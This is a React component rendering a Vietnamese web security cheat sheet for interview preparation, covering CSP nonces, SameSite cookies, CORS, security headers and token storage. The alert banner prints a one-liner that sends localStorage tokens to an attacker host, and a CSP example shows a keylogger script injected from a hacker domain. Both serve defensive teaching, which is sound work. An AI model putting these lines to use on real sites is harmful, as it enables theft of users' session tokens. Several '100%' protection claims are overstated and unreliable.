'use client';

import React, { useState } from 'react';
import {
  ShieldCheck,
  Lock,
  Key,
  Globe,
  Check,
  Copy,
  ChevronRight,
  Clock,
  ExternalLink,
  ShieldAlert,
  AlertTriangle,
  CheckCircle2,
  FileCode,
} from 'lucide-react';

export function WebSecurityCheatsheet() {
  const [activeTab, setActiveTab] = useState<'csp-headers' | 'auth-storage' | 'traps'>('csp-headers');
  const [activeQuestion, setActiveQuestion] = useState<0 | 1 | 2>(0);
  const [showAnswer, setShowAnswer] = useState<Record<number, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const toggleAnswer = (idx: number) => {
    setShowAnswer((prev) => ({ ...prev, [idx]: !prev[idx] }));
  };

  const questions = [
    {
      id: 0,
      title: 'Hacker đã chèn được thẻ <script> vào HTML (XSS). Làm sao để trình duyệt từ chối thực thi?',
      badge: 'Chống XSS Tuyệt Đối',
      pipeline: [
        { label: 'Hacker inject <script src="malicious.js">', bg: 'bg-rose-100 text-rose-950 border border-rose-300' },
        { label: 'Trình duyệt kiểm tra CSP Nonce Header', bg: 'bg-amber-100 text-amber-950 border border-amber-300' },
        { label: 'Thiếu nonce hợp lệ ➔ Chặn đứng mã độc 100%!', bg: 'bg-emerald-100 text-emerald-950 border border-emerald-300' },
      ],
      code: `// HTTP Response Header từ Server:
Content-Security-Policy: script-src 'self' 'nonce-rAnd0m123xyz' 'strict-dynamic';

// ❌ Đoạn mã do hacker tiêm nhiễm qua bình luận/input:
<script src="https://hacker.com/keylogger.js"></script>
// ➔ BỊ TRÌNH DUYỆT CHẶN NGAY LẬP TỨC:
// "Refused to load the script because it violates the following Content Security Policy directive"

// ✅ Đoạn mã hợp lệ từ hệ thống của bạn (có nonce khớp với Header):
<script nonce="rAnd0m123xyz" src="/static/bundle.js"></script> // Chạy bình thường!`,
      note: 'Chuỗi nonce phải là ngẫu nhiên mã hoá bằng thuật toán mật mã (cryptographically secure) và được làm mới trong mỗi HTTP request.',
      answerSummary: 'Sử dụng Content Security Policy (CSP) với cơ chế Nonce ngẫu nhiên cho mỗi request',
      answerDetail:
        'Kỹ thuật escape HTML truyền thống không thể đảm bảo 100% an toàn trước các lỗ hổng mXSS (mutation XSS) hay lỗi từ thư viện bên thứ ba. Bằng cách thiết lập CSP Header kèm nonce ngẫu nhiên (chỉ sinh tại server cho phiên request đó), trình duyệt sẽ từ chối chạy bất kỳ thẻ `<script>` hay inline event handler nào không mang đúng nonce bí mật này. Hacker dù có tiêm được mã độc vào DOM cũng hoàn toàn bị vô hiệu hoá.',
    },
    {
      id: 1,
      title: 'Phân biệt SameSite=Strict vs Lax: Bẫy mất phiên đăng nhập khi bấm từ Facebook / Gmail',
      badge: 'Cơ chế Cookie & CSRF',
      pipeline: [
        { label: 'User click link từ Gmail / Facebook', bg: 'bg-zinc-200 text-zinc-900' },
        { label: 'Nếu đặt SameSite=Strict', bg: 'bg-rose-100 text-rose-950 border border-rose-300' },
        { label: 'Browser KHÔNG gửi Cookie ➔ Mất trạng thái Login!', bg: 'bg-rose-100 text-rose-950 border border-rose-300' },
      ],
      code: `// CÁC MỨC ĐỘ SAMESITE:

// 1. SameSite=Strict:
// Cookie CHỈ ĐƯỢC GỬI khi người dùng đang ở trên chính trang đó.
// ❌ HẬU QUẢ: Khi bạn gửi link "https://app.com/order/123" qua Zalo/Email,
// người dùng click vào sẽ bị coi là CHƯA ĐĂNG NHẬP, bị đẩy về trang Login!

// 2. SameSite=Lax (Chuẩn mặc định khuyến nghị):
// Cookie ĐƯỢC GỬI với Top-Level Navigation an toàn (click thẻ <a> với GET).
// ✅ An toàn: Form POST ẩn từ website hacker không mang theo cookie (chống CSRF 100%),
// nhưng user click link từ bên ngoài vào vẫn giữ nguyên trạng thái đã login!

// 3. SameSite=None:
// Cookie gửi trong mọi cross-site request (iframe, fetch third-party).
// Bắt buộc phải có cờ "Secure" (chỉ chạy trên HTTPS).`,
      note: 'Đối với 95% trang web sản xuất, SameSite=Lax là sự cân bằng hoàn hảo giữa UX và bảo mật CSRF.',
      answerSummary: 'Chọn `SameSite=Lax` cho phiên người dùng, hoặc phân tách Session Cookie (Lax) và Sensitive Action Token (Strict).',
      answerDetail:
        '`SameSite=Strict` chặn toàn bộ cross-site context, kể cả việc chuyển trang cấp cao nhất (Top-Level GET navigation). Điều này tạo ra trải nghiệm rất tệ (UX penalty) vì khách hàng click link từ email hay mạng xã hội đều bị bắt đăng nhập lại. Vì vậy, chuẩn mực hiện đại là sử dụng `SameSite=Lax` cho cookie phiên làm việc, kết hợp với CSRF Anti-forgery Token hoặc Header `Origin` verification cho các tác vụ nhạy cảm (như chuyển tiền, đổi mật khẩu).',
    },
    {
      id: 2,
      title: 'Tại sao Postman và cURL gửi request API bình thường mà Trình duyệt lại bị lỗi CORS?',
      badge: 'Bản chất Sandbox Browser',
      pipeline: [
        { label: 'cURL / Postman (Không bị Sandbox)', bg: 'bg-emerald-100 text-emerald-950 border border-emerald-300' },
        { label: 'VS', bg: 'bg-zinc-200 text-zinc-900 font-bold' },
        { label: 'Trình duyệt Web (Bảo vệ người dùng bằng SOP)', bg: 'bg-blue-100 text-blue-950 border border-blue-300' },
      ],
      code: `// ⚠️ BẢN CHẤT CỦA CORS:
// 1. CORS là cơ chế của TRÌNH DUYỆT (Client-side Sandbox),
//    KHÔNG PHẢI là bức tường lửa bảo vệ Backend khỏi hacker!

// 2. Hacker hoàn toàn có thể viết script Python / cURL gửi request trực tiếp
//    vào API backend mà không cần qua trình duyệt!

// 3. Mục đích thực sự của CORS:
//    Bảo vệ NGƯỜI DÙNG trên Trình duyệt khỏi trang web độc hại (evil.com)
//    lén dùng JavaScript fetch('bank.com/transfer') khi người dùng đang có cookie phiên.

// ➔ OPTIONS Preflight gửi khi nào?
// Khi request có method: PUT, DELETE, PATCH hoặc có header tùy biến (Authorization, Content-Type: application/json).`,
      note: 'CORS ngăn JavaScript trên trình duyệt của người dùng đọc trộm dữ liệu, chứ không ngăn hacker tấn công backend qua terminal.',
      answerSummary: 'CORS là chính sách bảo mật do Trình duyệt thực thi dựa trên Same-Origin Policy (SOP).',
      answerDetail:
        'CORS (Cross-Origin Resource Sharing) là một cơ chế được tích hợp sẵn bên trong trình duyệt nhằm ngăn chặn mã JavaScript độc hại chạy trên một origin khác (VD: `attacker.com`) tự tiện gửi request và đọc response từ origin của bạn (`my-bank.com`). Postman, mobile app hay lệnh cURL không có môi trường trình duyệt và không tuân theo Same-Origin Policy nên chúng không bao giờ bị ảnh hưởng bởi CORS. Backend phải tự bảo vệ bằng Authentication, Rate Limiting và WAF.',
    },
  ];

  const currentQ = questions[activeQuestion];

  return (
    <article className="space-y-6 animate-in fade-in max-w-5xl mx-auto pb-12" aria-label="Sổ tay Web Security">
      {/* 1. Breadcrumbs */}
      <nav className="flex items-center gap-2 text-[13px] text-zinc-600 font-semibold" aria-label="Breadcrumb">
        <span>Network, Security &amp; Cache</span>
        <ChevronRight className="w-3.5 h-3.5 text-zinc-500" />
        <span className="text-zinc-900 font-bold">Web Security, CSP &amp; Auth Architecture</span>
      </nav>

      {/* 2. Hero Section */}
      <section className="space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-3xl sm:text-4xl font-bold tracking-tight text-zinc-950 font-serif">
              Web Security, CSP &amp; Auth Architecture
            </h1>
            <p className="text-[15px] sm:text-[16px] text-zinc-700 mt-1.5 leading-relaxed">
              Thiết lập phòng thủ đa tầng cho ứng dụng Frontend hiện đại: Content Security Policy (CSP Nonce/Hash), kiến trúc lưu trữ Token chuẩn ngân hàng, SameSite Cookie, HSTS và triệt tiêu các bẫy tấn công XSS, CSRF, Clickjacking.
            </p>
          </div>

          <div className="flex items-center gap-2 shrink-0 self-start sm:self-auto">
            <span className="px-3 py-1 rounded-full border border-emerald-300 bg-emerald-50 text-emerald-950 text-[12px] font-semibold flex items-center gap-1 shadow-2xs font-mono">
              🛡️ Senior Security
            </span>
            <span className="px-3 py-1 rounded-full border border-zinc-300 bg-zinc-50 text-zinc-800 text-[12px] font-semibold flex items-center gap-1 shadow-2xs">
              <Clock className="w-3.5 h-3.5 text-zinc-600" />
              15 phút
            </span>
          </div>
        </div>

        {/* Feature Visual Accent: 4-Layer Frontend Security Shield */}
        <div className="rounded-2xl border border-zinc-300 bg-[#FBF9F5] p-4 sm:p-5 shadow-2xs" data-visual="security-flow">
          <div className="flex items-center justify-between pb-3 border-b border-zinc-200">
            <div className="flex items-center gap-2 text-zinc-900 font-bold text-sm">
              <ShieldCheck className="w-4 h-4 text-emerald-700" />
              <span>Mô hình 4 lớp phòng thủ chiều sâu (Defense-in-Depth for Frontend)</span>
            </div>
            <span className="text-[11px] font-mono text-zinc-600 bg-white px-2 py-0.5 rounded border border-zinc-200 font-semibold">
              Bank-Grade Security
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 pt-3">
            <div className="p-3.5 rounded-xl bg-white border border-zinc-200 shadow-2xs space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-emerald-800">1. CSP Nonce</span>
                <Key className="w-3.5 h-3.5 text-zinc-500" />
              </div>
              <p className="text-[11px] text-zinc-600 leading-snug">
                Chặn 100% script lạ chạy trên trang nếu không có chuỗi nonce bí mật từ Server.
              </p>
            </div>

            <div className="p-3.5 rounded-xl bg-blue-50/70 border border-blue-300 shadow-2xs space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-blue-900">2. HttpOnly Cookie</span>
                <Lock className="w-3.5 h-3.5 text-blue-700" />
              </div>
              <p className="text-[11px] text-blue-900 leading-snug">
                Khoá token khỏi JavaScript `document.cookie`. XSS không thể đánh cắp refresh token.
              </p>
            </div>

            <div className="p-3.5 rounded-xl bg-purple-50/70 border border-purple-300 shadow-2xs space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-purple-900">3. SameSite=Lax</span>
                <ShieldAlert className="w-3.5 h-3.5 text-purple-700" />
              </div>
              <p className="text-[11px] text-purple-900 leading-snug">
                Ngăn chặn tấn công CSRF từ form giả mạo trên website hacker.
              </p>
            </div>

            <div className="p-3.5 rounded-xl bg-amber-50/70 border border-amber-300 shadow-2xs space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-amber-900">4. frame-ancestors</span>
                <Globe className="w-3.5 h-3.5 text-amber-700" />
              </div>
              <p className="text-[11px] text-amber-900 leading-snug">
                Cấm nhúng trang web vào `&lt;iframe&gt;` bên ngoài, triệt tiêu tấn công Clickjacking.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* 3. Underline Tab Bar */}
      <nav className="flex items-center gap-8 border-b border-zinc-200 pt-1 text-[15px]" aria-label="Nội dung sổ tay">
        <button
          onClick={() => setActiveTab('csp-headers')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'csp-headers'
              ? 'border-b-2 border-emerald-700 font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          Content Security Policy (CSP) &amp; Headers
        </button>

        <button
          onClick={() => setActiveTab('auth-storage')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'auth-storage'
              ? 'border-b-2 border-emerald-700 font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          Kiến trúc Lưu Trữ Token (BFF vs Cookie)
        </button>

        <button
          onClick={() => setActiveTab('traps')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'traps'
              ? 'border-b-2 border-emerald-700 font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          Bẫy phỏng vấn Senior Security
        </button>
      </nav>

      {/* 4. Alert Banner */}
      <section className="rounded-2xl border border-red-300 bg-red-50 p-4 flex items-start gap-3.5 shadow-2xs" aria-label="Cảnh báo">
        <div className="w-6 h-6 rounded-full bg-[#DC2626] text-white flex items-center justify-center font-bold text-xs shrink-0 mt-0.5 shadow-xs">
          !
        </div>
        <div>
          <h2 className="font-bold text-[15px] text-red-950">Tuyệt đối không lưu Access / Refresh Token trong LocalStorage</h2>
          <p className="text-[14px] text-red-950 mt-0.5 leading-relaxed font-medium">
            LocalStorage là không gian bộ nhớ toàn cục không có bất kỳ cơ chế bảo vệ nào! Chỉ cần ứng dụng của bạn dính 1 lỗ hổng XSS nhỏ hoặc một gói npm bên thứ ba bị nhiễm mã độc (Supply Chain Attack), toàn bộ token trong LocalStorage sẽ bị gửi về máy chủ của hacker trong 1 dòng code: <code>fetch(&apos;https://attacker.com?t=&apos; + localStorage.token)</code>.
          </p>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* TAB 1: CONTENT SECURITY POLICY (CSP)                                      */}
      {/* ========================================================================= */}
      {activeTab === 'csp-headers' && (
        <section className="space-y-6 animate-in fade-in" aria-label="CSP Headers">
          <div className="rounded-2xl border border-zinc-200 bg-white p-6 space-y-4 shadow-2xs">
            <h3 className="text-xl font-bold font-serif text-zinc-900">
              1. Bảng chỉ thị CSP chuẩn sản xuất (Production-Ready Directives)
            </h3>
            <p className="text-sm text-zinc-700 leading-relaxed">
              Header <code>Content-Security-Policy</code> kiểm soát chính xác nguồn gốc tài nguyên mà trình duyệt được phép tải về và thực thi.
            </p>

            <div className="rounded-xl border border-zinc-200 bg-zinc-900 text-zinc-100 p-4 font-mono text-xs overflow-x-auto leading-relaxed">
              <pre>{`Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-\${cryptoNonce}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline'; // Tailwind / Emotion CSS-in-JS
  img-src 'self' data: https://*.cloudinary.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.my-domain.com https://*.sentry.io;
  object-src 'none'; // Chặn triệt để flash/plugins cũ
  base-uri 'self';   // Chống tấn công sửa thẻ <base href="...">
  form-action 'self';
  frame-ancestors 'none'; // Chống Clickjacking (thay thế X-Frame-Options: DENY)`}</pre>
            </div>
          </div>

          <div className="rounded-2xl border border-zinc-200 bg-white p-6 space-y-4 shadow-2xs">
            <h3 className="text-xl font-bold font-serif text-zinc-900">
              2. Các Security Headers bắt buộc khác cho Strong Middle
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="p-3.5 rounded-xl border border-zinc-200 bg-zinc-50 space-y-1.5">
                <span className="font-mono text-xs font-bold text-zinc-900 block">Strict-Transport-Security</span>
                <code className="text-[11px] text-[#CC6745] font-mono block">max-age=63072000; includeSubDomains; preload</code>
                <p className="text-[11px] text-zinc-600">Ép trình duyệt chỉ giao tiếp qua HTTPS trong 2 năm, chống tấn công SSL Stripping.</p>
              </div>

              <div className="p-3.5 rounded-xl border border-zinc-200 bg-zinc-50 space-y-1.5">
                <span className="font-mono text-xs font-bold text-zinc-900 block">X-Content-Type-Options</span>
                <code className="text-[11px] text-[#CC6745] font-mono block">nosniff</code>
                <p className="text-[11px] text-zinc-600">Ngăn chặn trình duyệt tự ý đoán định dạng file (MIME-type sniffing attack).</p>
              </div>

              <div className="p-3.5 rounded-xl border border-zinc-200 bg-zinc-50 space-y-1.5">
                <span className="font-mono text-xs font-bold text-zinc-900 block">Referrer-Policy</span>
                <code className="text-[11px] text-[#CC6745] font-mono block">strict-origin-when-cross-origin</code>
                <p className="text-[11px] text-zinc-600">Bảo vệ query parameters nhạy cảm không bị rò rỉ sang website ngoài khi user chuyển trang.</p>
              </div>
            </div>
          </div>
        </section>
      )}

      {/* ========================================================================= */}
      {/* TAB 2: KIẾN TRÚC LƯU TRỮ TOKEN                                            */}
      {/* ========================================================================= */}
      {activeTab === 'auth-storage' && (
        <section className="space-y-6 animate-in fade-in" aria-label="Auth Architecture">
          <div className="rounded-2xl border border-zinc-200 bg-white p-6 space-y-4 shadow-2xs">
            <h3 className="text-xl font-bold font-serif text-zinc-900">
              1. So sánh 3 phương thức lưu trữ Token trong ứng dụng Web
            </h3>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-sans border-collapse">
                <thead>
                  <tr className="border-b border-zinc-300 text-zinc-900 font-mono">
                    <th className="py-2.5 px-3">Phương thức</th>
                    <th className="py-2.5 px-3">Kháng XSS</th>
                    <th className="py-2.5 px-3">Kháng CSRF</th>
                    <th className="py-2.5 px-3">Độ phức tạp triển khai</th>
                    <th className="py-2.5 px-3">Đánh giá chuyên gia</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-zinc-200 text-zinc-700">
                  <tr>
                    <td className="py-2.5 px-3 font-semibold text-zinc-900">LocalStorage</td>
                    <td className="py-2.5 px-3 text-rose-700 font-bold">❌ 0% (Bị đọc sạch)</td>
                    <td className="py-2.5 px-3 text-emerald-700 font-bold">✅ 100% Kháng CSRF</td>
                    <td className="py-2.5 px-3">Cực kỳ đơn giản</td>
                    <td className="py-2.5 px-3 text-rose-700 font-bold">Cấm dùng cho app tài chính/nhạy cảm</td>
                  </tr>
                  <tr>
                    <td className="py-2.5 px-3 font-semibold text-zinc-900">HttpOnly + Secure Cookie</td>
                    <td className="py-2.5 px-3 text-emerald-700 font-bold">✅ 100% (JS không đọc được)</td>
                    <td className="py-2.5 px-3 font-medium text-amber-700">Cần thêm SameSite=Lax</td>
                    <td className="py-2.5 px-3">Trung bình</td>
                    <td className="py-2.5 px-3 text-emerald-800 font-bold">Chuẩn mực vàng cho Web SPA</td>
                  </tr>
                  <tr>
                    <td className="py-2.5 px-3 font-semibold text-zinc-900">BFF Pattern (Next.js Server Session)</td>
                    <td className="py-2.5 px-3 text-emerald-700 font-bold">✅ Tuyệt đối an toàn</td>
                    <td className="py-2.5 px-3 text-emerald-700 font-bold">✅ Tuyệt đối an toàn</td>
                    <td className="py-2.5 px-3">Cần có Node server trung gian</td>
                    <td className="py-2.5 px-3 text-emerald-800 font-bold">Chuẩn cấp Enterprise / Ngân hàng</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <div className="rounded-2xl border border-zinc-200 bg-white p-6 space-y-4 shadow-2xs">
            <h3 className="text-xl font-bold font-serif text-zinc-900">
              2. Kiến trúc Token Rotation chuẩn Senior (In-Memory Access Token + HttpOnly Refresh Token)
            </h3>
            <p className="text-sm text-zinc-700 leading-relaxed">
              Mô hình tối ưu nhất: Lưu <strong>Access Token (thời hạn 15 phút)</strong> trong RAM JavaScript (closure hoặc React state). Lưu <strong>Refresh Token (thời hạn 7 ngày)</strong> trong HttpOnly Cookie. Khi Access Token hết hạn, Axios Interceptor tự động gửi request <code>/api/refresh</code> để lấy Access Token mới mà người dùng không hề nhận ra.
            </p>

            <div className="rounded-xl border border-zinc-200 bg-zinc-900 text-zinc-100 p-4 font-mono text-xs overflow-x-auto leading-relaxed">
              <pre>{`// Axios Interceptor tự động Refresh Token ngầm:
axiosInstance.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      try {
        // Gửi refresh token ngầm qua HttpOnly Cookie:
        const { data } = await axios.post('/api/auth/refresh', {}, { withCredentials: true });
        setAccessTokenInMemory(data.accessToken);
        originalRequest.headers.Authorization = \`Bearer \${data.accessToken}\`;
        return axiosInstance(originalRequest);
      } catch (refreshError) {
        // Refresh token cũng hết hạn ➔ Chuyển hướng đăng nhập
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    return Promise.reject(error);
  }
);`}</pre>
            </div>
          </div>
        </section>
      )}

      {/* ========================================================================= */}
      {/* TAB 3: BẪY PHỎNG VẤN SENIOR SECURITY                                      */}
      {/* ========================================================================= */}
      {activeTab === 'traps' && (
        <section className="space-y-6 animate-in fade-in" aria-label="Bẫy phỏng vấn">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            {questions.map((q, idx) => (
              <button
                key={q.id}
                onClick={() => setActiveQuestion(idx as any)}
                className={`p-3.5 rounded-xl border text-left transition-all cursor-pointer shadow-2xs ${
                  activeQuestion === idx
                    ? 'border-emerald-700 bg-emerald-50/40 ring-1 ring-emerald-600'
                    : 'border-zinc-200 bg-white hover:border-zinc-300'
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-zinc-100 text-zinc-700 font-semibold">
                    {q.badge}
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500">#{idx + 1}</span>
                </div>
                <h4 className="font-serif font-bold text-sm text-zinc-900 line-clamp-2">
                  {q.title}
                </h4>
              </button>
            ))}
          </div>

          {/* Current Question Inspector */}
          <div className="rounded-2xl border border-zinc-300 bg-white p-6 space-y-5 shadow-2xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-zinc-200">
              <span className="text-xs font-mono font-bold text-emerald-800 uppercase tracking-wider">
                Câu hỏi tình huống #{activeQuestion + 1} · {currentQ.badge}
              </span>
              <span className="text-xs font-mono text-zinc-500">Trọng tâm phỏng vấn Senior</span>
            </div>

            <h3 className="text-xl font-serif font-bold text-zinc-950">
              {currentQ.title}
            </h3>

            {/* Pipeline Step Visualizer */}
            <div className="flex flex-col sm:flex-row items-center gap-2 py-2">
              {currentQ.pipeline.map((p, idx) => (
                <React.Fragment key={idx}>
                  <div className={`p-2.5 rounded-lg text-xs font-mono font-semibold text-center w-full sm:w-auto flex-1 ${p.bg}`}>
                    {p.label}
                  </div>
                  {idx < currentQ.pipeline.length - 1 && (
                    <ChevronRight className="w-4 h-4 text-zinc-400 shrink-0 hidden sm:block" />
                  )}
                </React.Fragment>
              ))}
            </div>

            {/* Code / Configuration Snippet */}
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono text-zinc-600 font-semibold">Mã nguồn &amp; Cơ chế giải thích:</span>
                <button
                  onClick={() => handleCopy(`sec-q-${activeQuestion}`, currentQ.code)}
                  className="text-xs font-semibold text-emerald-800 hover:underline flex items-center gap-1 cursor-pointer"
                >
                  {copiedId === `sec-q-${activeQuestion}` ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>Sao chép mã</span>
                </button>
              </div>
              <pre className="text-zinc-800 font-mono text-xs bg-zinc-50 p-4 rounded-xl border border-zinc-200 overflow-x-auto leading-relaxed">
                {currentQ.code}
              </pre>
              <p className="text-xs text-zinc-500 italic mt-1">{currentQ.note}</p>
            </div>

            {/* Reveal Answer Button */}
            <div className="pt-2">
              <button
                onClick={() => toggleAnswer(activeQuestion)}
                className="w-full py-2.5 px-4 rounded-xl bg-zinc-100 hover:bg-zinc-200/80 text-zinc-900 font-semibold text-xs font-mono flex items-center justify-between transition-colors cursor-pointer"
              >
                <span>{showAnswer[activeQuestion] ? '▲ Ẩn đáp án chuyên sâu' : '▼ Xem đáp án giải mã Senior'}</span>
                <span className="text-[11px] text-zinc-500 font-normal">Click để đối chiếu tư duy</span>
              </button>

              {showAnswer[activeQuestion] && (
                <div className="mt-3 p-4 rounded-xl border border-emerald-300 bg-emerald-50/60 text-xs sm:text-sm text-emerald-950 space-y-2 animate-in fade-in font-sans leading-relaxed">
                  <div className="flex items-center gap-2 font-bold text-emerald-900">
                    <CheckCircle2 className="w-4 h-4 text-emerald-700 shrink-0" />
                    <span>{currentQ.answerSummary}</span>
                  </div>
                  <p className="text-zinc-800">{currentQ.answerDetail}</p>
                </div>
              )}
            </div>
          </div>
        </section>
      )}
    </article>
  );
}
